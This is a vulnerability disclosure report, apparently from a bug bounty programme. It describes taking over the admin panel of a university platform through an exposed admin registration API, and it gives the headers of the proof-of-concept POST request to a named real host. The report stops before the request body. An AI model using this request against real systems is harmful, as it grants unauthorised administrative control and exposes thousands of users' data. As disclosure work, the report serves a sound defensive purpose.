## Description

## Vulnerability Details

I was able to completely takeover university admin panel on \`dash.university.shardeum.org\` this gives me full access to block unblock almost 20K users, view their data I also have full access to all courses to delete them completely also I can delete other admin accounts as well.

## Proof of Concept

## Proof of Concept

The was possible because the following admin registration API endpoint was available which enabled me to register an admin account and then login to that admin account.

To register an admin account do a POST request to the following HTTP request with your email and password.

\`\`\` POST /api/admin/register HTTP/1.1 Host: api.university.shardeum.org Connection: close sec-ch-ua: "Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121" Accept: application/json, text/plain, _/_ sec-ch-ua-mobile: ?0 User-Agent: Mozilla/5.0 (X11; Linux x86\_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 sec-ch-ua-platform: "Linux" Origin: https://university.shardeum.org Sec-Fetch-Site: same-site Sec-Fetch-Mode: cors Sec-Fetch-Dest: empty Referer: https://university.shardeum.org/ Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9 If-None-Match: W/"b49-ha6cnPGQKUWujk1808h938ZMeIo" Content-Length: 58 Content-Type: application/json
